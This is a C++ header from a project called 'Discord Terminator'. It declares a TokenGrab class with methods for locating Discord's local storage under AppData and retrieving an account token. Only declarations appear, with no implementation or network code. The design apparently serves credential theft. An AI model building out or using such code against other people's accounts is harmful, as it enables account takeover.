/*
	FILE FROM PROJECT DISCORD TERMINATOR BY ANDRO24
	LICENSED UNDER GNU General Public License v3.0

	PLEASE DON'T USE THIS TO STEAL OTHER PEOPLE'S DISCORD TOKEN!
*/

#pragma once
#include <iostream>

class TokenGrab {
public:
	TokenGrab();
	
	bool properWay();
	bool ghettoWay();

	std::string getToken() { return _token; }

private:
#ifdef UNICODE
#define getAppDataPath getAppDataPathW
#else
#define getAppDataPath getAppDataPathA
#endif

	std::string getAppDataPathA();
	std::wstring getAppDataPathW();

#ifdef UNICODE
#define getDiscordLocalStorage getDiscordLocalStorageW
#else
#define getDiscordLocalStorage getDiscordLocalStorageA
#endif

	std::string getDiscordLocalStorageA();
	std::wstring getDiscordLocalStorageW();

	std::string _token;
};